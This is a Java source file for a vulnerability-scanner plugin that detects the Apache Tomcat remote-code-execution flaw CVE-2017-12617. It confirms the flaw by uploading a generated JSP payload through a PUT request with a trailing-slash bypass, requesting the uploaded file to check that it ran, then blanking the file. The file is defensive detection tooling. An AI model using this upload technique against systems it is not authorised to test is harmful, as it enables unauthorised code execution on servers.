/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve201712617;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.put;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.UUID;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects highly critical RCE CVE-2017-12617. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2017-12617 Detector",
    version = "0.1",
    description = "Detects CVE-2017-12617 RCE vulnerability in Apache Tomcat.",
    author = "Leonardo Tamiano (leonardo.tamiano@mindedsecurity.com)",
    bootstrapModule = Cve201712617DetectorBootstrapModule.class)
public final class Cve201712617Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE_2017-12617";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE = "Apache Tomcat RCE CVE-2017-12617";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "Vulnerable Apache Tomcat versions (9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46"
          + " and 7.0.0 to 7.0.81) containing a servlet context configured with readonly=false"
          + " within the web.xml configuration, allow unauthenticated actors to upload arbitrary"
          + " JSP files to the server via a specially crafted request. The uploaded JSP file could"
          + " then be requested and any code it contained would be executed by the server, leading"
          + " to Remote Code Execution (RCE).";

  @VisibleForTesting
  static final String RECOMMENDATION =
      "Upgrade to non-vulnerable versions of Apache Tomcat (>= 9.0.1, 8.5.23, 8.0.47, 7.0.82) and"
          + " ensure that readonly is set to true for the default servlet, and for the webdav"
          + " servlet. Block HTTP Methods that allow untrusted users to modify server's resources";

  // filename that will be uploaded to tomcat root dir
  private static final String JSP_FILENAME = String.format("%s.jsp", UUID.randomUUID());

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve201712617Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting CVE-2017-12617 RCE detection.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    boolean isVulnerable = false;

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.JSP)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);

    // Bypass works by appending a '/' character to an arbitrary JSP filepath.
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + JSP_FILENAME + "/";
    logger.atInfo().log("Uploading JSP file at '%s'", targetUri);
    try {
      // blocking call.
      HttpResponse response =
          httpClient.send(
              put(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/x-www-form-urlencoded")
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(payload.getPayload()))
                  .build());
    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Request to target '%s' failed: could not upload JSP file", targetUri);
      return false;
    }

    // Remove the '/' to access the uploaded JSP
    targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + JSP_FILENAME;
    logger.atInfo().log("Requesting JSP file at '%s'", targetUri);
    try {
      // blocking call.
      HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build());
      String body = response.bodyString().orElse("default");

      // check if file was uploaded and executed
      isVulnerable = response.status().isSuccess() && payload.checkIfExecuted(body);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Request to target %s failed: could not retrieve JSP file", networkService);
      return false;
    }

    // Clean Up
    targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + JSP_FILENAME + "/";
    logger.atInfo().log("Cleaning JSP file at '%s'", targetUri);
    try {
      // blocking call.
      HttpResponse response =
          httpClient.send(
              put(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/x-www-form-urlencoded")
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(""))
                  .build());
    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Request to target '%s' failed: could not cleanup", targetUri);
    }

    return isVulnerable;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULN_DESCRIPTION)
                .setRecommendation(RECOMMENDATION))
        .build();
  }
}
